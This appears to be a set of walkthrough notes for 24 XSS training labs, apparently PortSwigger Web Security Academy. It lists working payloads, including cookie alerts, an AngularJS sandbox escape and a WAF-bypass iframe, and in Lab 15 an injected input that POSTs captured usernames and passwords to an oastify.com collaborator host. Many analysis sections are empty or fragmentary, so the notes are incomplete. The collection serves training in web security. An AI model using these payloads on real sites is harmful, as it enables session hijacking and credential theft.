# Xss - Walkthroughs

```mermaid
graph TD
    Root["Xss"]
    Root --> L0["Lab 01"]
    click L0 href "#lab-01"
    Root --> L1["Lab 02"]
    click L1 href "#lab-02"
    Root --> L2["Lab 03"]
    click L2 href "#lab-03"
    Root --> L3["Lab 04"]
    click L3 href "#lab-04"
    Root --> L4["Lab 05"]
    click L4 href "#lab-05"
    Root --> L5["Lab 06"]
    click L5 href "#lab-06"
    Root --> L6["Lab 07"]
    click L6 href "#lab-07"
    Root --> L7["Lab 08"]
    click L7 href "#lab-08"
    Root --> L8["Lab 09"]
    click L8 href "#lab-09"
    Root --> L9["Lab 10"]
    click L9 href "#lab-10"
    Root --> L10["Lab 11"]
    click L10 href "#lab-11"
    Root --> L11["Lab 12"]
    click L11 href "#lab-12"
    Root --> L12["Lab 13"]
    click L12 href "#lab-13"
    Root --> L13["Lab 14"]
    click L13 href "#lab-14"
    Root --> L14["Lab 15"]
    click L14 href "#lab-15"
    Root --> L15["Lab 16"]
    click L15 href "#lab-16"
    Root --> L16["Lab 17"]
    click L16 href "#lab-17"
    Root --> L17["Lab 18"]
    click L17 href "#lab-18"
    Root --> L18["Lab 19"]
    click L18 href "#lab-19"
    Root --> L19["Lab 20"]
    click L19 href "#lab-20"
    Root --> L20["Lab 21"]
    click L20 href "#lab-21"
    Root --> L21["Lab 22"]
    click L21 href "#lab-22"
    Root --> L22["Lab 23"]
    click L22 href "#lab-23"
    Root --> L23["Lab 24"]
    click L23 href "#lab-24"
```

## Lab 01: Reflected XSS into HTML context with nothing encoded

Target Goal - Exploit XSS vulnerability to call the alert function.

## Analysis

---

## Lab 02: Stored XSS into HTML context with nothing encoded

Target Goal - Exploit the stored XSS vulnerability to call the alert function.

## Analysis

---

## Lab 03: DOM XSS in document.write sink using source location.search

Target Goal - Exploit the DOM-based XSS vulnerability to call the alert function.

## Analysis

">

">

---

## Lab 04: DOM XSS in innerHTML sink using source location.search

Target Goal - Exploit the DOM-based XSS vulnerability to call the alert function.

## Analysis

---

## Lab 05: DOM XSS in jQuery anchor href attribute sink using location.search source

Target Goal - Exploit the DOM-based XSS vulnerability to make the "back" link alert document.cookie.

## Analysis

javascript:alert(document.cookie)

---

## Lab 06: DOM XSS in jQuery selector sink using a hashchange event

Target Goal - Exploit the DOM-based XSS vulnerability to call the print() function.

## Analysis

https://0a6e00b7036df1f6c1a449050018007a.web-security-academy.net/#%3Cimg%20src=1%20onerror=print()%3E

---

## Lab 07: Reflected XSS into attribute with angle brackets HTML-encoded

Target Goal - Exploit reflected XSS vulnerability to call the alert function

## Analysis

name=search value="" onmouseover="alert(1)">

" onmouseover="alert(1)

---

## Lab 08: Stored XSS into anchor href attribute with double quotes HTML-encoded

Target Goal - Exploit stored XSS vulnerability to call the alert function

## Analysis

href="javascript:alert(1)">

---

## Lab 09: Reflected XSS into a JavaScript string with angle brackets HTML encoded

Target Goal - Exploit the reflected XSS vulnerability to call the alert function.

## Analysis

var searchTerms = ''-alert(1)-'';

'; alert(1); '

'-alert(1)-'

---

## Lab 10: DOM XSS in document.write sink using source location.search inside a select element

Target Goal - Exploit the DOM XSS vulnerability to call the alert function.

## Analysis

<select name=storeId>
<option selected>Paris2</select></option>

Paris2</select>

---

## Lab 11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Target Goal - Exploit the DOM XSS vulnerability to call the alert function.

## Analysis

{{$on.constructor('alert(1)')()}}

test"

---

## Lab 12: Reflected DOM XSS

Target Goal - Exploit the DOM XSS vulnerability to call the alert function.

## Analysis

12345\"}; alert(1);//

---

## Lab 13: Stored DOM XSS

Target Goal - Exploit the DOM XSS vulnerability to call the alert function.

## Analysis

<>

---

## Lab 14: Exploiting cross-site scripting to steal cookies

Target Goal - Exploit stored XSS vulnerability in the blog comment functionality to steal the vitim's session cookie.

## Analysis

---

## Lab 15: Exploiting cross-site scripting to capture passwords

Target Goal - Exploit stored XSS vulnerability in the blog comment functionality to exfiltrate the victim's username and password. 

## Analysis

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length) fetch('https://yegpr9y3bh9i9mgrxv32oywmedk48vwk.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    body: username.value+':'+this.value
});">

---

## Lab 16: Exploiting XSS to perform CSRF

Target Goal - Exploit stored XSS vulnerability in the blog comment functionality to perform a CSRF attack and change the email address of the victim user.

Creds - wiener:peter

## Analysis

---

## Lab 17: Reflected XSS into HTML context with most tags and attributes blocked

Target Goal - Perform an XSS attack that bypasses the WAF and calls the print() function.

## Analysis

<body onresize="print()">

https://0a01002703c7c0a7c2486677005900fa.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E

<iframe src="https://0a01002703c7c0a7c2486677005900fa.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.width='100px'></iframe>

---

## Lab 18: Reflected XSS into HTML context with all tags blocked except custom ones

Target Goal - Perform an XSS attack that alerts on document.cookie.

## Analysis

---

## Lab 19: Reflected XSS with some SVG markup allowed

Target Goal - Perform an XSS attack that calls the alert function.

## Analysis

---

## Lab 20: Reflected XSS in canonical link tag

Target Goal - Perform an XSS attack  on the homepage that injects an attribute that calls the alert function.

## Analysis

<link rel="canonical" href='https://0a4c00fe0454d3bdc0c59a4a007a0072.web-security-academy.net/?randome=test'%09onclick='alert(1)'%09accesskey='x'/>

---

## Lab 21: Reflected XSS into a JavaScript string with single quote and backslash escaped

Target Goal - Perform an XSS attack that calls the alert function.

## Analysis

</script>

---

## Lab 22: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Target Goal - Perform an XSS attack that calls the alert function.

## Analysis

test\'; alert(1);//

---

## Lab 23: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Target Goal - Perform an XSS attack that calls the alert function when the comment author name is clicked.

## Analysis

onclick="var tracker={track(){}};tracker.track('http://www.test.ca&apos;-alert(1)-&apos;');">

http://www.test.ca&apos;-alert(1)-&apos;

---

## Lab 24: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

Target Goal - Exploit XSS vulnerability and call the alert function.

## Analysis

${alert(1)}

---

